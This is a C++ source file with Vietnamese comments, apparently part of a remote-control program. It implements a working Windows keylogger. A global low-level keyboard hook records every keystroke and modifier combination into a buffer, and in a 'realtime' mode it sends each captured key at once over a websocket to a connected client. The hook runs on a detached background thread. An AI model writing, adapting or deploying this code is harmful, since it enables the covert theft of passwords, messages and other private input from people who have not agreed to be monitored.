#include "Keylogger.h"

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD key = pKeyBoard->vkCode;

        if (pKeyBoard->flags & LLKHF_INJECTED) {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        // --- TRƯỜNG HỢP 1: KEYDOWN ---
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            // Logic thêm vào hàng chờ (Pending)
            if (key == VK_LSHIFT || key == VK_RSHIFT ||
                key == VK_LCONTROL || key == VK_RCONTROL ||
                key == VK_LMENU || key == VK_RMENU ||
                key == VK_LWIN || key == VK_RWIN)
            {
                g_PendingModifiers.insert(key);
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            // Logic xử lý tổ hợp và xóa hàng chờ
            bool isLShift = IsKeyDown(VK_LSHIFT);
            bool isRShift = IsKeyDown(VK_RSHIFT);
            bool isLCtrl = IsKeyDown(VK_LCONTROL);
            bool isRCtrl = IsKeyDown(VK_RCONTROL);
            bool isLAlt = IsKeyDown(VK_LMENU);
            bool isRAlt = IsKeyDown(VK_RMENU);
            bool isLWin = IsKeyDown(VK_LWIN);
            bool isRWin = IsKeyDown(VK_RWIN);

            bool isAnyModifier = isLShift || isRShift || isLCtrl || isRCtrl || isLAlt || isRAlt || isLWin || isRWin;

            if (isLShift) g_PendingModifiers.erase(VK_LSHIFT);
            if (isRShift) g_PendingModifiers.erase(VK_RSHIFT);
            if (isLCtrl)  g_PendingModifiers.erase(VK_LCONTROL);
            if (isRCtrl)  g_PendingModifiers.erase(VK_RCONTROL);
            if (isLAlt)   g_PendingModifiers.erase(VK_LMENU);
            if (isRAlt)   g_PendingModifiers.erase(VK_RMENU);
            if (isLWin)   g_PendingModifiers.erase(VK_LWIN);
            if (isRWin)   g_PendingModifiers.erase(VK_RWIN);

            // Mapping Phím
            std::string keyName = "";
            bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool isLetter = false;

            if (key >= 65 && key <= 90) {
                keyName = std::string(1, (char)(key + 32)); // A-Z -> a-z
                isLetter = true;
            }
            else if (key >= 48 && key <= 57) {
                keyName = std::string(1, (char)key); // 0-9
            }
            else if (key >= 96 && key <= 105) {
                keyName = std::string(1, (char)(key - 48)); // Numpad
            }
            else {
                // Các phím đặc biệt (Đã tách dòng rõ ràng)
                switch (key) {
                    // Cơ bản
                case VK_SPACE:      keyName = "SPACE"; break;
                case VK_RETURN:     keyName = "ENTER"; break;
                case VK_BACK:       keyName = "BS"; break;
                case VK_TAB:        keyName = "TAB"; break;
                case VK_ESCAPE:     keyName = "ESC"; break;
                case VK_DELETE:     keyName = "DEL"; break;
                case VK_CAPITAL:    keyName = "CAPSLOCK"; break;

                    // Dấu câu
                case VK_OEM_1:      keyName = ";"; break;
                case VK_OEM_PLUS:   keyName = "="; break;
                case VK_OEM_COMMA:  keyName = ","; break;
                case VK_OEM_MINUS:  keyName = "-"; break;
                case VK_OEM_PERIOD: keyName = "."; break;
                case VK_OEM_2:      keyName = "/"; break;
                case VK_OEM_3:      keyName = "`"; break;
                case VK_OEM_4:      keyName = "["; break;
                case VK_OEM_5:      keyName = "\\"; break;
                case VK_OEM_6:      keyName = "]"; break;
                case VK_OEM_7:      keyName = "'"; break;

                    // F-Keys
                case VK_F1:  keyName = "F1"; break;
                case VK_F2:  keyName = "F2"; break;
                case VK_F3:  keyName = "F3"; break;
                case VK_F4:  keyName = "F4"; break;
                case VK_F5:  keyName = "F5"; break;
                case VK_F6:  keyName = "F6"; break;
                case VK_F7:  keyName = "F7"; break;
                case VK_F8:  keyName = "F8"; break;
                case VK_F9:  keyName = "F9"; break;
                case VK_F10: keyName = "F10"; break;
                case VK_F11: keyName = "F11"; break;
                case VK_F12: keyName = "F12"; break;

                    // Điều hướng
                case VK_LEFT:   keyName = "LEFT"; break;
                case VK_UP:     keyName = "UP"; break;
                case VK_RIGHT:  keyName = "RIGHT"; break;
                case VK_DOWN:   keyName = "DOWN"; break;
                case VK_INSERT: keyName = "INSERT"; break;
                case VK_HOME:   keyName = "HOME"; break;
                case VK_PRIOR:  keyName = "PGUP"; break;
                case VK_NEXT:   keyName = "PGDN"; break;
                case VK_END:    keyName = "END"; break;

                    // Media & Numpad Math
                case VK_VOLUME_MUTE:        keyName = "VOL_MUTE"; break;
                case VK_VOLUME_DOWN:        keyName = "VOL_DOWN"; break;
                case VK_VOLUME_UP:          keyName = "VOL_UP"; break;
                case VK_MEDIA_NEXT_TRACK:   keyName = "MEDIA_NEXT"; break;
                case VK_MEDIA_PREV_TRACK:   keyName = "MEDIA_PREV"; break;
                case VK_MEDIA_STOP:         keyName = "MEDIA_STOP"; break;
                case VK_MEDIA_PLAY_PAUSE:   keyName = "MEDIA_PLAY"; break;
                case VK_SNAPSHOT:           keyName = "PRINTSCREEN"; break;

                case VK_BROWSER_BACK:       keyName = "BROWSER_BACK"; break;
                case VK_BROWSER_FORWARD:    keyName = "BROWSER_FWD"; break;
                case VK_BROWSER_REFRESH:    keyName = "BROWSER_REFRESH"; break;
                case VK_BROWSER_HOME:       keyName = "BROWSER_HOME"; break;
                case VK_BROWSER_SEARCH:     keyName = "BROWSER_SEARCH"; break;

                case VK_ADD:        keyName = "+"; break;
                case VK_SUBTRACT:   keyName = "-"; break;
                case VK_MULTIPLY:   keyName = "*"; break;
                case VK_DIVIDE:     keyName = "/"; break;
                case VK_DECIMAL:    keyName = "."; break;

                default: break;
                }
            }

            // Ghi log
            if (!keyName.empty()) {
                std::string final = "";
                if (isAnyModifier) {
                    final = "[";
                    if (isLCtrl) final += "CTRL(Left)+";
                    if (isRCtrl) final += "CTRL(Right)+";
                    if (isLAlt)  final += "ALT(Left)+";
                    if (isRAlt)  final += "ALT(Right)+";
                    if (isLShift) final += "SHIFT(Left)+";
                    if (isRShift) final += "SHIFT(Right)+";
                    final += keyName + "]";
                }
                else {
                    if (keyName == "ENTER") {
                        final = "[ENTER]\n";
                    }
                    else if (keyName.length() > 1) {
                        final = "[" + keyName + "]";
                    }
                    else {
                        if (isLetter && isCaps) {
                            final = std::string(1, keyName[0] - 32);
                        }
                        else {
                            final = keyName;
                        }
                    }
                }
                
                std::lock_guard<std::mutex> lock(g_LogMutex);
                g_KeylogBuffer += final;
                
                // Real-time Mode: Gửi ngay lập tức cho client
                if (g_KeylogMode == "realtime" && g_ClientConnected && g_ServerPtr != nullptr) {
                    try {
                        json j_realtime;
                        j_realtime["type"] = "KEYLOG_REALTIME";
                        j_realtime["data"] = final;
                        g_ServerPtr->send(g_ClientHdl, j_realtime.dump(), websocketpp::frame::opcode::text);
                    }
                    catch (...) {
                        // Bỏ qua lỗi gửi
                    }
                }
            }
        }
        // --- TRƯỜNG HỢP 2: KEYUP ---
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            if (g_PendingModifiers.count(key)) {
                std::string modName = "";
                switch (key) {
                case VK_LSHIFT:   modName = "[SHIFT(Left)]"; break;
                case VK_RSHIFT:   modName = "[SHIFT(Right)]"; break;
                case VK_LCONTROL:
                    // [FIX] Nếu Right Alt đang được giữ thì cái Left Ctrl này là hàng giả của Windows -> Bỏ qua
                    if (GetAsyncKeyState(VK_RMENU) & 0x8000) return CallNextHookEx(NULL, nCode, wParam, lParam);
                    modName = "[CTRL(Left)]";
                    break;
                case VK_RCONTROL: modName = "[CTRL(Right)]"; break;
                case VK_LMENU:    modName = "[ALT(Left)]"; break;
                case VK_RMENU:    modName = "[ALT(Right)]"; break;
                case VK_LWIN:     modName = "[WIN(Left)]"; break;
                case VK_RWIN:     modName = "[WIN(Right)]"; break;
                }
                if (!modName.empty()) {
                    std::lock_guard<std::mutex> lock(g_LogMutex);
                    g_KeylogBuffer += modName;
                    
                    // Real-time Mode: Gửi ngay lập tức cho client
                    if (g_KeylogMode == "realtime" && g_ClientConnected && g_ServerPtr != nullptr) {
                        try {
                            json j_realtime;
                            j_realtime["type"] = "KEYLOG_REALTIME";
                            j_realtime["data"] = modName;
                            g_ServerPtr->send(g_ClientHdl, j_realtime.dump(), websocketpp::frame::opcode::text);
                        }
                        catch (...) {
                            // Bỏ qua lỗi gửi
                        }
                    }
                }
                g_PendingModifiers.erase(key);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeyloggerThread() {
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(g_hHook);
}

void StartKeyloggerThread() {
    std::thread t(KeyloggerThread);
    t.detach();
}